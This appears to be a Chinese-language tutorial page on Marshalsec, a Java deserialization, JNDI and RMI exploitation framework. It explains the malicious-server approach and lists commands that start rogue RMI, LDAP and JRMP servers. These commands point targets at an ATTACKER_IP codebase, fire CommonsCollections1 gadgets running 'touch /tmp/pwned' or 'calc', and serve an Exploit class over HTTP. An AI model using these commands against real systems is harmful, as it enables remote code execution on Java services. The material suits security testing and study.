---
title: Marshalsec
---

是什么？
Marshalsec 是一个用于研究和利用 Java 反序列化、JNDI 以及 RMI 安全问题的攻击与测试框架，由著名 Java 安全研究员 Moritz Bechler 开发。
该工具并非传统意义上的“漏洞利用脚本”，而是一组可快速启动恶意服务端组件的集合，用于配合目标 Java 应用触发不安全的对象加载或反序列化行为。

解决的核心问题？
在 Java 漏洞利用中，攻击者通常面临一个关键难点：如何让目标 JVM 在“看似正常的协议交互”中，执行攻击者的代码？
Marshalsec 的解决思路是：不直接向目标推送 payload 而是构造合法协议响应诱导 JVM 在反序列化 / JNDI 查找 / RMI 交互过程中自行加载并执行恶意对象或类。因此，Marshalsec 的本质并不是“发 payload”，而是扮演协议中的“可信服务端角色”。

> 官网
>
> - <https://github.com/mbechler/marshalsec>
>
> 参考
>
> - [77burger | Marshalsec 工具详解](https://www.cnblogs.com/77burger/p/19498939)

<!-- more -->

Marshalsec 采用模块化设计，不同模块对应不同的 Java 安全攻击面：

```java
                 ┌────────────┐
                 │  目标 JVM  │
                 └─────▲──────┘
                       │
     ┌─────────────────┼─────────────────┐
     │                 │                 │
RMI Registry        LDAP Server       JRMP Listener
 (JNDI)              (JNDI)            (RMI 序列化)
```

攻击者通过 Marshalsec 启动其中某一类服务，等待目标 JVM 主动连接并触发漏洞。

```bash
# 安装Marshalsec
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
mvn clean package -DskipTests

# Marshalsec通用格式
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar <MainClass> [args...]

# 启动RMIRefServer【固定监听1099】
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
marshalsec.jndi.RMIRefServer \
http://ATTACKER_IP:HTTP_PORT/#Exploit

# 启动LDAPRefServer【固定监听1389】
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
marshalsec.jndi.LDAPRefServer \
http://ATTACKER_IP:HTTP_PORT/#Exploit

# LDAPRefServer+序列化对象
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
marshalsec.jndi.LDAPRefServer \
CommonsCollections1 \
"touch /tmp/pwned"

# 启动恶意JRMP Server
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
marshalsec.jrmp.JRMPListener \
1099 CommonsCollections1 "calc"    # 监听端口：1099；ysoserial gadget:CommonsCollections1；执行命令：calc

# RMI Registry反序列化
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
marshalsec.rmi.RMIRegistryExploit \
1099 CommonsCollections1 "touch /tmp/pwned"

# HTTPServer
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar \
marshalsec.util.SimpleHTTPServer 8000

# 强关联命令
javac Exploit.java    # 编译Exploit.class
python3 -m http.server 8000    //启动 HTTP Codebase
```
